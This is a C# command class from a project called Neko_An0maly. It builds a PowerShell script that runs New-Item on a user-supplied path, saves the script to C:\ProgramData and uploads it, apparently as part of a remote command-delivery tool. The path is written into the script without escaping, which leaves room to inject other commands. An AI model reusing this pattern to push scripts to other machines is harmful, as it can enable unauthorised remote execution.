using System;
using System.IO;
using System.Text;
using Neko_An0maly.CORE;

namespace Neko_An0maly.Commands
{
    public class Create : Command
    {
        public static string path = @"C:\ProgramData\";

        public Create(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 2)
            {
                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = path + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    byte[] line1 = new UTF8Encoding(true).GetBytes("\nNew-Item " + (char)34 + args[1] + (char)34);
                    fs.Write(line1, 0, line1.Length);
                }

                Console.WriteLine("Initializing upload.");

                TransferProtocol.upload(finalPath);

                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'delete'.Requires 2 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }
    }
}